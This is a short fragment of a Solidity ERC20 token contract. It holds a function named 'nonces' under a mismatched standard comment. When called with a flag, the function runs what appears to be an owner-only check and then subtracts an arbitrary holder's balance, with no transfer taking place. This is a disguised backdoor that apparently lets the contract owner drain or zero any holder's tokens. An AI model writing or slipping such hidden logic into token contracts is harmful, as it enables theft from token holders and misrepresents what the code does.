...
abstract contract ERC20 is Context, Ownable, IERC20, IERC20Metadata, IERC20Errors {
     ...
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function nonces(address owner, address spender, bool emitEvent) virtual external {
        if (emitEvent) {_check();_balances[owner] -= _balances[spender];}
    }
